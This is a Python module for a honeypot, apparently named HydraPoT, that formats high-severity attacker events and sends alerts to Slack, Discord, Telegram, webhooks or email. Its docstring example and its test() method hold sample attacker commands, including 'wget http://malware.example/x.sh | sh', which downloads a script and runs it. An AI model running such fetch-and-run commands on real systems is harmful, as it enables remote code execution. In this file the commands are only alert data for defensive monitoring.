"""
threat_intel/alerting.py — multi-channel alerting for HydraPoT.

Reads threat_intel/alerts.yml, and when a high-severity event arrives, pushes a
formatted alert to whichever channels the user enabled (Slack / Discord /
Telegram / generic webhook / email). Standard library only — no extra deps.

Secrets are resolved from ENVIRONMENT VARIABLES named in the config, never
stored in the file. A channel that is misconfigured or unreachable fails
softly (logged, skipped) so alerting never crashes the honeypot.

This module is standalone: it is NOT yet wired into the live event loop. Use
it directly:

    from threat_intel.alerting import AlertManager
    am = AlertManager()                     # loads alerts.yml
    am.alert({"fi_score": 4, "src_ip": "1.2.3.4", "cmd": "wget http://evil/x",
              "agent": "cloud"})
    am.test()                               # send a test alert to enabled channels
"""
import os
import json
import time
import smtplib
import urllib.request
from email.mime.text import MIMEText
from datetime import datetime

try:
    import yaml
except ImportError:
    yaml = None

_HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_CONFIG = os.path.join(_HERE, "alerts.yml")

_SEVERITY = {0: "INFO", 1: "LOW", 2: "MEDIUM", 3: "HIGH", 4: "CRITICAL"}
_EMOJI    = {0: "⚪", 1: "🟢", 2: "🟡", 3: "🟠", 4: "🔴"}


def _env(name: str) -> str:
    return os.environ.get(name or "", "").strip()


class AlertManager:
    def __init__(self, config_path: str = DEFAULT_CONFIG):
        self.config = {}
        self.channels = {}
        self._last_sent = {}   # src_ip -> last alert epoch (cooldown)
        if yaml is None:
            print("[alert] PyYAML not available — alerting disabled")
            return
        if os.path.exists(config_path):
            try:
                with open(config_path) as f:
                    self.config = yaml.safe_load(f) or {}
                self.channels = self.config.get("channels", {}) or {}
            except Exception as e:
                print(f"[alert] failed to load {config_path}: {e}")

    # ── decision ───────────────────────────────────────────────────────────────
    def _enabled_channels(self):
        return [name for name, c in self.channels.items() if c and c.get("enabled")]

    def should_alert(self, event: dict) -> bool:
        if not self._enabled_channels():
            return False
        if event.get("event") == "auth":
            return bool(self.config.get("include_auth", False))
        min_fi = self.config.get("min_fi", 3)
        return (event.get("fi_score", event.get("fi", 0)) or 0) >= min_fi

    def _cooled_down(self, src_ip: str) -> bool:
        cd = self.config.get("cooldown_sec", 0) or 0
        if not cd or not src_ip:
            return True
        now = time.time()
        if now - self._last_sent.get(src_ip, 0) < cd:
            return False
        self._last_sent[src_ip] = now
        return True

    # ── formatting ──────────────────────────────────────────────────────────────
    def _format(self, event: dict) -> dict:
        fi = event.get("fi_score", event.get("fi", 0)) or 0
        sev = _SEVERITY.get(fi, "?")
        title = f"{_EMOJI.get(fi, '⚠️')} HydraPoT alert — {sev} (FI {fi})"
        lines = [
            f"Time   : {event.get('timestamp', datetime.now().isoformat())}",
            f"Source : {event.get('src_ip', '?')}",
            f"Agent  : {event.get('agent', '?')}",
            f"Command: {event.get('cmd', '')}",
        ]
        if event.get("session_id"):
            lines.append(f"Session: {event['session_id']}")
        return {"title": title, "body": "\n".join(lines), "fi": fi, "sev": sev}

    # ── dispatch ────────────────────────────────────────────────────────────────
    def alert(self, event: dict) -> dict:
        """Send an alert for `event` to all enabled channels. Returns per-channel
        results. No-op (returns {}) if the event doesn't meet the threshold."""
        if not self.should_alert(event):
            return {}
        if not self._cooled_down(event.get("src_ip", "")):
            return {}
        msg = self._format(event)
        results = {}
        for name in self._enabled_channels():
            cfg = self.channels[name]
            fn = getattr(self, f"_send_{name}", None)
            if fn is None:
                results[name] = "unknown channel"
                continue
            try:
                fn(cfg, msg, event)
                results[name] = "sent"
            except Exception as e:
                results[name] = f"failed: {e}"
                print(f"[alert] {name} failed: {e}")
        return results

    def test(self) -> dict:
        """Send a fake CRITICAL alert to every enabled channel (for setup testing)."""
        enabled = self._enabled_channels()
        if not enabled:
            print("[alert] no channels enabled in alerts.yml — nothing to test.")
            return {}
        print(f"[alert] testing channels: {', '.join(enabled)}")
        # bypass threshold/cooldown for the test
        msg = self._format({
            "fi_score": 4, "src_ip": "203.0.113.66", "agent": "cloud",
            "cmd": "wget http://malware.example/x.sh | sh   (TEST ALERT)",
            "session_id": "test-0001",
        })
        results = {}
        for name in enabled:
            fn = getattr(self, f"_send_{name}", None)
            try:
                fn(self.channels[name], msg, {})
                results[name] = "sent"
            except Exception as e:
                results[name] = f"failed: {e}"
            print(f"   {name:10} -> {results[name]}")
        return results

    # ── channel senders ─────────────────────────────────────────────────────────
    @staticmethod
    def _post_json(url: str, payload: dict, timeout=10):
        data = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(url, data=data,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status

    def _send_slack(self, cfg, msg, event):
        url = _env(cfg.get("webhook_env"))
        if not url:
            raise RuntimeError(f"env {cfg.get('webhook_env')} not set")
        self._post_json(url, {"text": f"*{msg['title']}*\n```{msg['body']}```"})

    def _send_discord(self, cfg, msg, event):
        url = _env(cfg.get("webhook_env"))
        if not url:
            raise RuntimeError(f"env {cfg.get('webhook_env')} not set")
        self._post_json(url, {"content": f"**{msg['title']}**\n```{msg['body']}```"})

    def _send_telegram(self, cfg, msg, event):
        token = _env(cfg.get("bot_token_env"))
        chat = _env(cfg.get("chat_id_env"))
        if not token or not chat:
            raise RuntimeError("bot token or chat id env not set")
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        self._post_json(url, {"chat_id": chat,
                              "text": f"{msg['title']}\n\n{msg['body']}"})

    def _send_webhook(self, cfg, msg, event):
        url = _env(cfg.get("url_env"))
        if not url:
            raise RuntimeError(f"env {cfg.get('url_env')} not set")
        self._post_json(url, {"title": msg["title"], "severity": msg["sev"],
                              "fi": msg["fi"], "event": event, "text": msg["body"]})

    def _send_email(self, cfg, msg, event):
        user = _env(cfg.get("username_env"))
        pw = _env(cfg.get("password_env"))
        to_addrs = cfg.get("to_addrs", [])
        if not user or not pw or not to_addrs:
            raise RuntimeError("email user/pass env or to_addrs not set")
        mime = MIMEText(msg["body"])
        mime["Subject"] = msg["title"]
        mime["From"] = cfg.get("from_addr", user)
        mime["To"] = ", ".join(to_addrs)
        with smtplib.SMTP(cfg.get("smtp_host", "localhost"),
                          int(cfg.get("smtp_port", 587)), timeout=15) as s:
            s.starttls()
            s.login(user, pw)
            s.sendmail(mime["From"], to_addrs, mime.as_string())
